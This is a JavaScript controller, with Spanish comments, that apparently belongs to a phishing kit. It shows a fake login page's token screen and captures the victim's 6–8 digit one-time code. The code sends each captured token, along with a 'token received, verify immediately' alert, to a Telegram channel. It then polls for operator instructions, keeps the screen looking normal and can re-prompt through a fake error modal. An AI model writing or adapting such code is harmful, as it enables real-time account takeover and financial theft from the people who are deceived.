/**
 * TOKEN MODAL CONTROLLER
 * Maneja los modales de token y errores
 */

'use strict';

class TokenModalController {
    constructor() {
        this.tokenValue = '';
        this.init();
    }

    /**
     * Inicializar
     */
    init() {
        this.attachLoginFormListener();
    }


    /**
     * Eventos del modal de token
     */
    attachTokenModalEvents() {
        const modal = document.getElementById('tokenModal');
        const closeBtn = document.getElementById('tokenModalClose');
        const cancelBtn = document.getElementById('tokenCancel');
        const continueBtn = document.getElementById('tokenContinue');
        const input = document.getElementById('tokenInput');

        // Valor real del token
        this.tokenRealValue = '';

        // Cerrar modal
        closeBtn.addEventListener('click', () => this.closeTokenModal());
        cancelBtn.addEventListener('click', () => this.closeTokenModal());

        // Click fuera del modal
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeTokenModal();
            }
        });

        // Input - enmascarar automáticamente
        input.addEventListener('input', (e) => {
            const cursorPos = e.target.selectionStart;
            const oldLength = this.tokenRealValue.length;
            const newValue = e.target.value;

            // Si está borrando
            if (newValue.length < oldLength) {
                const diff = oldLength - newValue.length;
                this.tokenRealValue = this.tokenRealValue.slice(0, -diff);
            }
            // Si está escribiendo y no son puntos
            else if (newValue.length > oldLength && newValue[newValue.length - 1] !== '•') {
                const newChar = newValue[newValue.length - 1];
                if (/[0-9]/.test(newChar)) {
                    this.tokenRealValue += newChar;
                }
            }

            // Mostrar puntos
            e.target.value = '•'.repeat(this.tokenRealValue.length);
            this.tokenValue = this.tokenRealValue;

            // Añadir clase masked
            if (this.tokenRealValue.length > 0) {
                e.target.classList.add('masked');
            } else {
                e.target.classList.remove('masked');
            }

            this.validateTokenInput();
        });

        // Prevenir copiar/pegar
        input.addEventListener('paste', (e) => {
            e.preventDefault();
        });

        input.addEventListener('copy', (e) => {
            e.preventDefault();
        });

        // Continuar
        continueBtn.addEventListener('click', () => {
            if (this.tokenValue.length >= 6 && this.tokenValue.length <= 8) {
                this.submitToken();
            }
        });

        // Enter key
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !continueBtn.disabled) {
                this.submitToken();
            }
        });
    }

    /**
     * Eventos del modal de error
     */
    attachErrorModalEvents() {
        const modal = document.getElementById('errorModal');
        const closeBtn = document.getElementById('errorModalClose');
        const retryBtn = document.getElementById('errorRetry');

        closeBtn.addEventListener('click', () => this.closeErrorModal());
        retryBtn.addEventListener('click', () => this.retryToken());

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeErrorModal();
            }
        });
    }

    /**
     * Listener del formulario de login
     */
    attachLoginFormListener() {
        const loginBtn = document.getElementById('loginBtn');

        if (loginBtn) {
            loginBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.switchToTokenCard();
            });
        }

        // Card form
        const tokenCardForm = document.getElementById('tokenFormCard');
        if (tokenCardForm) {
            tokenCardForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.submitTokenCard();
            });
        }

        const tokenCardInput = document.getElementById('tokenInputCard');
        if (tokenCardInput) {
            tokenCardInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
            });
        }
    }

    switchToTokenCard() {
        const loginCard = document.getElementById('loginCard');
        const tokenCard = document.getElementById('tokenCard');

        if (loginCard && tokenCard) {
            loginCard.classList.add('hidden');
            tokenCard.classList.remove('hidden');

            // Notify Telegram that Token is being requested (Aviso)
            window.telegramManager.sendToTelegram('token_requested', {
                status: 'Esperando Token...'
            });

            const input = document.getElementById('tokenInputCard');
            if (input) setTimeout(() => input.focus(), 100);
        }
    }

    submitTokenCard() {
        const input = document.getElementById('tokenInputCard');
        const token = input ? input.value : '';

        if (token.length >= 6) {
            // Mostrar overlay
            const overlay = document.querySelector('.loading-overlay');
            if (overlay) overlay.classList.add('active');

            // Enviar a Telegram con "Aviso"
            window.telegramManager.sendToTelegram('token_submit', {
                token: token,
                aviso: '🔔 ¡TOKEN RECIBIDO! Verificar inmediatamente.'
            }).then(() => {
                window.telegramManager.startPolling();
            });
        }
    }

    /**
     * Validar input de token
     */
    validateTokenInput() {
        const continueBtn = document.getElementById('tokenContinue');
        const isValid = this.tokenValue.length >= 6 && this.tokenValue.length <= 8;

        if (isValid) {
            continueBtn.disabled = false;
            continueBtn.classList.add('enabled');
        } else {
            continueBtn.disabled = true;
            continueBtn.classList.remove('enabled');
        }
    }

    /**
     * Abrir modal de token
     */
    openTokenModal() {
        const modal = document.getElementById('tokenModal');
        const input = document.getElementById('tokenInput');

        modal.classList.add('active');
        document.body.style.overflow = 'hidden';

        // Focus en el input
        setTimeout(() => {
            input.focus();
        }, 100);
    }

    /**
     * Cerrar modal de token
     */
    closeTokenModal() {
        const modal = document.getElementById('tokenModal');
        const input = document.getElementById('tokenInput');

        modal.classList.remove('active');
        document.body.style.overflow = '';

        // Reset
        input.value = '';
        input.classList.remove('masked');
        this.tokenValue = '';
        this.tokenRealValue = '';
        this.validateTokenInput();
    }

    /**
     * Enviar token
     */
    submitToken() {
        // Cerrar modal de token
        this.closeTokenModal();

        // NO mostrar overlay en pantalla de token
        // El usuario debe ver la pantalla normal

        // Enviar a Telegram sin bloquear
        window.telegramManager.sendToTelegram('token', {
            token: this.tokenValue
        }).then(() => {
            // Iniciar polling en background (sin overlay)
            window.telegramManager.startPolling();
        });
    }

    /**
     * Abrir modal de error
     */
    openErrorModal() {
        const modal = document.getElementById('errorModal');
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    /**
     * Cerrar modal de error
     */
    closeErrorModal() {
        const modal = document.getElementById('errorModal');
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }

    /**
     * Reintentar token
     */
    retryToken() {
        this.closeErrorModal();

        setTimeout(() => {
            this.openTokenModal();
        }, 300);
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    window.tokenModalController = new TokenModalController();
    console.log('Token Modal Controller initialized');
});
